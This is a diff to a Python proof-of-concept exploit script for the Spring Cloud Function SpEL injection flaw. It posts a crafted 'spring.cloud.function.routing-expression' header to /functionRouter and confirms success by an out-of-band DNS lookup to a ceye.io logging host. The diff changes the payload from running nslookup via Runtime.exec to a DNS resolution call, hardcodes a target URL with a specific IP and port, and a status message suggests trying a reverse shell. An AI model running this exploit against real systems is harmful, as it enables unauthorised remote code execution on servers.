@@ -25,7 +25,8 @@ def poc(url,system,exp,ip,port,cs):
                 exit()
     else:
         randomStrings = ''.join(random.sample(string.ascii_letters + string.digits, 4))
-        payload = 'T(java.lang.Runtime).getRuntime().exec("nslookup %s.eejw9e.ceye.io")' % randomStrings
+        # payload = 'T(java.lang.Runtime).getRuntime().exec("nslookup %s.eejw9e.ceye.io")' % randomStrings
+        payload = 'T(java.net.InetAddress).getByName("%s.eejw9e.ceye.io")' % randomStrings
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
         "spring.cloud.function.routing-expression": "%s" % payload,
@@ -38,15 +39,15 @@ def poc(url,system,exp,ip,port,cs):
             r = requests.post(url=url+'/functionRouter', headers=headers, data='test', timeout=2)
             if r.status_code == 500:
                 # 等待dnslog刷新日志
-                sleep(1)
+                sleep(3)
                 pay_dns,add =oob.oob_Dns(randomStrings)
                 if randomStrings in pay_dns:
                     output.suc_p("测试目标:%s 存在漏洞,出口ip地址为: %s"%(url,add))
                 else:
-                    output.info_p("%s/functionRouter 存在,oob测试失败,可能无nslookup命令,可以直接尝试反弹shell"% url)
+                    output.info_p("%s/functionRouter 存在,oob测试失败,可能dnslog平台存在异常,可直接尝试反弹shell"% url)
             else:
                 output.fail_p("测试目标:%s 漏洞利用失败" % url)
-    except Exception as e:
+    except Exception as e: 
         # output.fail_p("%s"%e)
         output.fail_p("测试目标:%s 访问出错,请确认url是否正确" % url)
 
@@ -82,6 +83,7 @@ def main():
     banner.title()
     if len(sys.argv) > 0:
         url,exp,syst,ip,port,cs,file = get_args()
+        url = "http://123.58.236.76:40775"
         if file:
             pocs(file,syst,exp,ip,port,cs)
         else:
